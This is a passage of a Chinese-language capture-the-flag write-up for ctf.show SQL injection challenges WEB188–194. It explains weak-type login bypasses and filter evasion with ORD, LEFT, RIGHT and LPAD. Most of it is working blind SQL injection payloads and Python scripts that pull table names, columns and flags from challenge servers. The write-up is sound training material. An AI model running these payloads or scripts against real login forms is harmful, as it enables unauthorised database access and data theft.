class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==intval(<span class="hljs-variable">$password</span>)){<br>     <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>     array_push(<span class="hljs-variable">$ret</span>[<span class="hljs-string">'data'</span>], array(<span class="hljs-string">'flag'</span>=&gt;<span class="hljs-variable">$flag</span>));<br>   }<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1</span>&lt;<span class="hljs-number">1</span>&amp;password=<span class="hljs-number">0</span><br><span class="hljs-attribute">username</span>=<span class="hljs-number">0</span>&amp;password=<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>KEY:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">在where <span class="hljs-attribute">username</span>=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来。<br>而<span class="hljs-attribute">password</span>=0的原因在于这里：<br>intval让等号右边为数字0<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==intval(<span class="hljs-variable">$password</span>)){<br>没错。。。弱类型比较，看来查出来的pass也都是以字母开头的，所以<span class="hljs-attribute">password</span>=0可以成功弱类型比较，得到flag。<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB189"><a href="#WEB189" class="headerlink" title="WEB189"></a>WEB189</h3><p>username=0/1，为0返回的是密码错误，是1返回的就是查询失败</p><p>PY:</p><figure class="highlight haskell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-meta"># 每秒发送不超过5个请求</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br> <br><span class="hljs-title">url</span> = <span class="hljs-string">"http://91ac287a-8719-4b8f-8ecc-11e2ab145ee9.challenge.ctf.show/api/"</span><br><span class="hljs-title">flagstr</span> = <span class="hljs-string">"}{&lt;&gt;$=,;_ 'abcdefghijklmnopqr-stuvwxyz0123456789"</span><br> <br><span class="hljs-title">flag</span> = <span class="hljs-string">""</span><br><span class="hljs-title">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">257</span>,<span class="hljs-number">257</span>+<span class="hljs-number">60</span>):<br>for x <span class="hljs-keyword">in</span> flagstr:<br><span class="hljs-class"><span class="hljs-keyword">data</span>={</span><br><span class="hljs-class">"<span class="hljs-title">username</span>":"<span class="hljs-title">if</span>(<span class="hljs-title">substr</span>(<span class="hljs-title">load_file</span>('/<span class="hljs-title">var</span>/<span class="hljs-title">www</span>/<span class="hljs-title">html</span>/<span class="hljs-title">api</span>/<span class="hljs-title">index</span>.<span class="hljs-title">php'</span>),{},1)=('{}'),1,0)".format(<span class="hljs-title">i</span>,<span class="hljs-title">x</span>),</span><br><span class="hljs-string">"password"</span>:<span class="hljs-string">"0"</span><br>}<br>print(<span class="hljs-class"><span class="hljs-keyword">data</span>)</span><br>response = requests.post(url,<span class="hljs-class"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)</span><br>time.sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-keyword">if</span> response.text.find(<span class="hljs-string">"8d25"</span>)&gt;<span class="hljs-number">0</span>:<br>#print(<span class="hljs-string">"{} is right"</span>.format(x))<br>flag+=x<br>break<br><span class="hljs-keyword">else</span>:<br>#print(<span class="hljs-string">"{} is wrong"</span>.format(x))<br>continue<br>print(flag)<br> <br></code></pre></td></tr></tbody></table></figure><p>返回数据：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">{"<span class="hljs-selector-tag">code</span>":<span class="hljs-number">0</span>,<span class="hljs-string">"msg"</span>:<span class="hljs-string">"\u67e5\u8be2\u5931\u8d25"</span>,<span class="hljs-string">"count"</span>:<span class="hljs-number">0</span>,<span class="hljs-string">"data"</span>:[]}<br>Unicode 编码表示的字符串：查询失败<br></code></pre></td></tr></tbody></table></figure><p>SQL语句：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select pass from ctfshow_user where username = <span class="hljs-keyword">if</span>(substr(load<span class="hljs-constructor">_file('<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">api</span><span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>')</span>,<span class="hljs-number">263</span>,<span class="hljs-number">1</span>)=(<span class="hljs-character">'='</span>),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB190"><a href="#WEB190" class="headerlink" title="WEB190"></a>WEB190</h3><p>二分法盲注：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br><br>s=<span class="hljs-string">"q{wertyuiopasdfghjklzxcvbnm1234567890_-}"</span><br>url=<span class="hljs-string">"http://de04b297-1b06-4df9-8fa0-4593e56e697e.challenge.ctf.show//api/"</span><br>flag=<span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">32</span><br>    high=<span class="hljs-number">128</span><br>    mid=(low+high)<span class="hljs-comment">//2</span><br>    while low&lt;high:<br>        payload=<span class="hljs-string">"'or ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),{},1))&gt;{}#"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,mid)<br>        #payload=<span class="hljs-string">"' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{},1,0)-- -"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,j)<br>        #payload=<span class="hljs-string">"' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{},1,0)-- -"</span><span class="hljs-selector-class">.format</span>(<span class="hljs-selector-tag">i</span>,j)<br>        <br>        data={<br>            <span class="hljs-string">"username"</span>:payload,<br>            <span class="hljs-string">"password"</span>:<span class="hljs-number">1</span><br>        }<br>        <br>        r=requests<span class="hljs-selector-class">.post</span>(url,data=data)<br>        <span class="hljs-built_in">print</span>(low,mid,high)<br>      <br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">"\\u5bc6\\u7801\\u9519\\u8bef"</span> <span class="hljs-keyword">in</span> r<span class="hljs-selector-class">.text</span>:<br>            low=mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high=mid<br>        mid=(low+high)<span class="hljs-comment">//2</span><br>    flag+=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br>    <span class="hljs-keyword">if</span> mid==<span class="hljs-number">32</span>:<br>        <span class="hljs-built_in">print</span>(flag)  <br>        break<br></code></pre></td></tr></tbody></table></figure><h2 id="WEB191"><a href="#WEB191" class="headerlink" title="WEB191"></a>WEB191</h2><p>这一题明确提示了<strong>布尔盲注</strong>，也就是说在某个条件下，页面返回的数据会有<strong>真假值</strong>的切换。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/查询语句<br>  <span class="hljs-variable">$sql</span> = <span class="hljs-string">"select pass from ctfshow_user where username = '<span class="hljs-subst">{$username}</span>'"</span>;<br><br>/密码检测<br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>  }<br><br>  <span class="hljs-comment">//密码判断</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>    }<br><br>  <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/file|into|ascii/i'</span>, <span class="hljs-variable">$username</span>)){<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>));<br>    }<br></code></pre></td></tr></tbody></table></figure><p>SQL函数ord():</p><p>在 SQL 中，<code>ORD()</code> 函数用于返回给定字符的 ASCII 值。ASCII（American Standard Code for Information Interchange）是一种用于表示字符的编码标准，其中每个字符都对应一个唯一的数字值。</p><p><code>ORD()</code> 函数通常用于字符串操作，它接受一个参数，即要获取 ASCII 值的字符，然后返回该字符的 ASCII 值。</p><p>以下是 <code>ORD()</code> 函数的示例用法：</p><figure class="highlight isbl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">SELECT</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ORD</span></span>(<span class="hljs-string">'A'</span>);</span><br></code></pre></td></tr></tbody></table></figure><p>上述示例将返回字符 ‘A’ 的 ASCII 值，即 65。</p><p>PY:</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">128</span>#<br></code></pre></td></tr></tbody></table></figure><p>我们来看查询语句：</p><p><code>$sql = "select pass from ctfshow_user where username = '{$username}'";</code></p><figure class="highlight arcade"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">在 PHP 中，如果在双引号字符串中使用花括号 {} 来包裹变量，PHP 将会将花括号中的内容视为变量的名称，并将其替换为变量的值。因此，在给定的代码中，变量 <span class="hljs-symbol">$user</span>name 的值会被替换到 SQL 语句中的 {<span class="hljs-symbol">$user</span>name} 的位置。<br><br>例如，如果 <span class="hljs-symbol">$user</span>name 的值为 <span class="hljs-string">"john123"</span>，那么最终的 SQL 语句会变为：<br><span class="hljs-symbol">$s</span>ql = <span class="hljs-string">"select pass from ctfshow_user where username = 'john123'"</span>;<br></code></pre></td></tr></tbody></table></figure><p>因此是存在SQL注入的，也没有过滤ord()函数，因此我们在where语句后拼接条件：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">128</span>#<br><span class="hljs-string">' or ord(substr((select database()),1,1))&lt;128#</span><br></code></pre></td></tr></tbody></table></figure><p>判断数据库名称的第一个字符是否小于128，可以说就是一个永真条件，<strong>因此会返回满足条件的全部密码</strong>，但是密码肯定匹配不上，会返回<strong>密码错误</strong>。</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> pass <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username = <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> ord(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span>#<br><span class="hljs-string">' or ord(substr((select database()),1,1))&lt;0#</span><br></code></pre></td></tr></tbody></table></figure><p>这样就是一个永假条件，在题目中，会返回数据，<strong>用户不存在</strong>。</p><p>这样就有了真假值切换，我们就可以用来盲注。</p><figure class="highlight lua"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs lua">import requests<br>import <span class="hljs-built_in">time</span><br><br>url = <span class="hljs-string">"http://33cf3e91-9901-4946-9a8d-8b1a83402017.challenge.ctf.show/api/"</span><br>flag = <span class="hljs-string">""</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span><br>    <span class="hljs-built_in">min</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">min</span> == mid):<br>            flag += chr(mid)<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        # id,f1ag<br>        # payload = <span class="hljs-string">"admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))&lt;{})#"</span>.<span class="hljs-built_in">format</span>(i, mid)<br>        payload = <span class="hljs-string">"' or ord(substr((select database()),{},1))&lt;{}#"</span>.<span class="hljs-built_in">format</span>(i, mid)<br><br>        data = {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: <span class="hljs-number">0</span><br>        }<br>        res = requests.post(url, data=data)<br>        <span class="hljs-built_in">print</span>(res.text)<br>        <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">0.3</span>)<br>        <span class="hljs-keyword">if</span> res.text.<span class="hljs-built_in">find</span>(<span class="hljs-string">"8bef"</span>) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">max</span> = mid<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = mid<br></code></pre></td></tr></tbody></table></figure><p>flag:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>{<span class="hljs-number">4529</span>e0fe-<span class="hljs-number">9</span>e1a-<span class="hljs-number">443</span>b-b192-<span class="hljs-number">882</span>f5da1cb34}<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB192"><a href="#WEB192" class="headerlink" title="WEB192"></a>WEB192</h3><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>密码检测<br><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$password</span>)){<br>  <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'密码只能为数字'</span>;<br>  die(json_encode(<span class="hljs-variable">$ret</span>));<br>}<br><br><span class="hljs-regexp">//</span>密码判断<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">'pass'</span>]==<span class="hljs-variable">$password</span>){<br>    <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'登陆成功'</span>;<br>  }<br><br><span class="hljs-regexp">//</span>TODO:感觉少了个啥，奇怪<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/file|into|ascii|ord|hex/i'</span>, <span class="hljs-variable">$username</span>)){<br>      <span class="hljs-variable">$ret</span>[<span class="hljs-string">'msg'</span>]=<span class="hljs-string">'用户名非法'</span>;<br>      die(json_encode(<span class="hljs-variable">$ret</span>));<br>  }<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight sas"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sas">import requests<br>import time<br><br>url = <span class="hljs-string">"http://d03cc6e6-314e-471d-96ad-97c271bdd238.challenge.ctf.show/api/"</span><br><br>flagstr = <span class="hljs-string">"}{abcdefghijklmnopqr-stuvwxyz0123456789"</span><br>flag = <span class="hljs-string">""</span><br>for i <span class="hljs-keyword">in</span> <span class="hljs-meta">range</span>(1, 60):<br>    for <span class="hljs-keyword">key</span> <span class="hljs-keyword">in</span> flagstr:<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_web<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # ctfshow_fl0g<br>        # payload = <span class="hljs-string">"admin'and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),{},1))&lt;{})#"</span>.<span class="hljs-keyword">format</span>(i,mid)<br>        # id,f1ag<br>        payload = <span class="hljs-string">"'or ((substr((select f1ag from ctfshow_fl0g),{},1)='{}'))#"</span>.<span class="hljs-keyword">format</span>(i, <span class="hljs-keyword">key</span>)<br><span class="hljs-keyword"></span><br><span class="hljs-keyword">        data </span>= {<br>            <span class="hljs-string">"username"</span>: payload,<br>            <span class="hljs-string">"password"</span>: 0,<br>        }<br>        res = requests.post(url=url, data=data)<br>        time.sleep(0.3)<br>        <span class="hljs-keyword">if</span> res.text.find(<span class="hljs-string">"8bef"</span>) &gt; 0:<br>            flag += <span class="hljs-keyword">key</span><br>            pr<span class="hljs-meta">int</span>(flag)<br>            break<br><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB193"><a href="#WEB193" class="headerlink" title="WEB193"></a>WEB193</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">ord</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">substr</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">username</span>)</span>){<br>        $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='用户名非法';<br>        die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br>    }<br></code></pre></td></tr></tbody></table></figure><p>增加了过滤substr()函数，使用left(),right()函数即可。</p><h4 id="LEFT"><a href="#LEFT" class="headerlink" title="LEFT:"></a>LEFT:</h4><p>在 SQL 中，<code>LEFT()</code> 函数是用于从字符串的左侧提取指定长度的字符或子字符串的函数。它接受两个参数：一个是要提取的字符串，另一个是要提取的字符或子字符串的长度。</p><p><code>LEFT()</code> 函数的语法如下：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">LEFT(<span class="hljs-params">string</span>, <span class="hljs-params">length</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>其中：</p><ul><li><code>string</code> 是要提取字符或子字符串的源字符串。</li><li><code>length</code> 是一个整数，表示要提取的字符或子字符串的长度。</li></ul><p><code>LEFT()</code> 函数会从 <code>string</code> 的左侧开始提取长度为 <code>length</code> 的字符或子字符串，并将其作为结果返回。</p><p>以下是一个使用 <code>LEFT()</code> 函数的示例：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LEFT</span>(<span class="hljs-string">'Hello, World!'</span>, <span class="hljs-number">5</span>);<br></code></pre></td></tr></tbody></table></figure><p>上述示例将返回字符串 <code>'Hello'</code>，因为它从左侧开始提取了长度为 5 的字符或子字符串。</p><h4 id="RIGHT"><a href="#RIGHT" class="headerlink" title="RIGHT:"></a>RIGHT:</h4><p>在 SQL 中，<code>RIGHT()</code> 函数用于从字符串的右侧提取指定长度的字符或子字符串。它接受两个参数：一个是要提取的字符串，另一个是要提取的字符或子字符串的长度。</p><p><code>RIGHT()</code> 函数的语法如下：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-literal">RIGHT</span>(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">length</span>)<br></code></pre></td></tr></tbody></table></figure><p>其中：</p><ul><li><code>string</code> 是要提取字符或子字符串的源字符串。</li><li><code>length</code> 是一个整数，表示要提取的字符或子字符串的长度。</li></ul><p><code>RIGHT()</code> 函数会从 <code>string</code> 的右侧开始提取长度为 <code>length</code> 的字符或子字符串，并将其作为结果返回。</p><p>以下是一个使用 <code>RIGHT()</code> 函数的示例：</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">RIGHT</span>(<span class="hljs-string">'Hello, World!'</span>, <span class="hljs-number">6</span>);<br></code></pre></td></tr></tbody></table></figure><p>上述示例将返回字符串 <code>'World!'</code>，因为它从右侧开始提取了长度为 6 的字符或子字符串。</p><figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = <span class="hljs-string">"'or ((left((select f1ag from ctfshow_flxg),{})='{}'))#"</span>.format(i,flag + key)<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB194"><a href="#WEB194" class="headerlink" title="WEB194"></a>WEB194</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//<span class="hljs-doctag">TODO:</span>感觉少了个啥，奇怪</span><br>   <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">file</span>|<span class="hljs-params">into</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">ord</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">substr</span>|<span class="hljs-params">char</span>|<span class="hljs-params">left</span>|<span class="hljs-params">right</span>|<span class="hljs-params">substring</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>', $<span class="hljs-params">username</span>)</span>){<br>       $ret<span class="hljs-literal">['<span class="hljs-identifier">msg</span>']</span>='用户名非法';<br>       die(json<span class="hljs-constructor">_encode($<span class="hljs-params">ret</span>)</span>);<br></code></pre></td></tr></tbody></table></figure><h4 id="LPAD"><a href="#LPAD" class="headerlink" title="LPAD()"></a>LPAD()</h4><p>类似的，还有rpad()函数。</p><p>在 SQL 中，<code>LPAD()</code> 函数用于在字符串的左侧填充指定字符，使其达到指定的长度。它接受三个参数：一个是要填充的字符串，另一个是目标长度，最后一个是要填充的字符。</p><p><code>LPAD()</code> 函数的语法如下：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">LPAD(<span class="hljs-params">string</span>, <span class="hljs-params">length</span>, <span class="hljs-params">fill_character</span>)</span><br></code></pre></td></tr></tbody></table></figure><p>其中：</p><ul><li><code>string</code> 是要填充的字符串。</li><li><code>length</code> 是最终目标长度，如果字符串长度小于目标长度，则进行填充。</li><li><code>fill_character</code> 是要填充的字符。</li></ul><p><code>LPAD()</code> 函数会在 <code>string</code> 字符串的左侧不断添加 <code>fill_character</code> 字符，直到达到指定的 <code>length</code> 长度。如果字符串已经达到或超过目标长度，将不会进行填充，而是直接返回原始字符串。</p><p>以下是一个使用 <code>LPAD()</code> 函数的示例：</p><figure class="highlight pgsql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> LPAD(<span class="hljs-string">'Hello'</span>, <span class="hljs-number">10</span>, <span 